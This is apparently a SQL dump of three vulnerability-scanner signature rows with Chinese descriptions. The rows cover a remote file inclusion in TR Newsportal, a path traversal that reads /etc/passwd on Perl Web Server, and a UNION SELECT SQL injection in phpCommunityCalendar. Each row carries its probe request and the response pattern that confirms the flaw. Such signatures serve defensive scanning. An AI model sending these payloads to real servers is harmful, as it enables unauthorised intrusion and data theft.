INSERT INTO `cgidb` VALUES ('7022', null, '系统命令执行', '/extras/poll/poll.php?file_newsportal=@RFIURL', 'GET', '@RFIURL_RESPONSE', '2', null, null, null, null, 'TR Newsportal是一种基于Web的新闻查看、张贴系统。\r\n\r\nTR Newsportal处理用户请求时存在输入验证漏洞，远程攻击者可能利用此漏洞在服务器上以Web进程权限执行任意命令。\r\n\r\nTR Newsportal的poll.php脚本没有正确验证file_newsportal参数的输入，允许攻击者通过包含本地或外部资源的任意文件导致执行任意PHP代码。', null, null, '1', '6778', '补丁：http://www.newsportal.one.pl/');
INSERT INTO `cgidb` VALUES ('7023', null, '系统命令执行', '/../../../../etc/passwd', 'GET', '/bin/(bash|sh)[^\\r\\n<>]*[\\r\\n]', '3', null, null, null, null, 'Perl Web Server 是一个还处在实验阶段的跨平台WEB服务器项目。它没有阻止远程\r\n用户访问虚拟WWW根目录以外的路径。这意味着如果攻击者知道敏感文件相对虚拟WWW\r\n根目录的路径，就可以提交URL请求获取敏感文件内容。', null, null, '1', '6779', '');
INSERT INTO `cgidb` VALUES ('7024', null, 'SQL注入', '/month.php?query=CalendarDetailsID=-1) UNION SELECT md5(333),0 FROM phpcalendar_adminusers WHERE AdminUserID = 1/*', 'GET', '310dcbbf4cce62f762a2aaa148d556bd', '2', null, null, null, null, 'phpCommunityCalendar是一款基于WEB的PHP编写的协同工作程序。\r\n\r\nphpCommunityCalendar对用户提交给的参数缺少正确充分的过滤，远程攻击者可以利用此漏洞非授权操作数据库。\r\n\r\nphpCommunityCalendar的多个脚本对用户提交的多个参数数据缺少充分过滤，远程攻击者可以通过在输入数据中插入特定的SQL命令来非授权获取对数据库的访问。', null, null, '1', '6780', '补丁：http://open.appideas.com/Calendar');
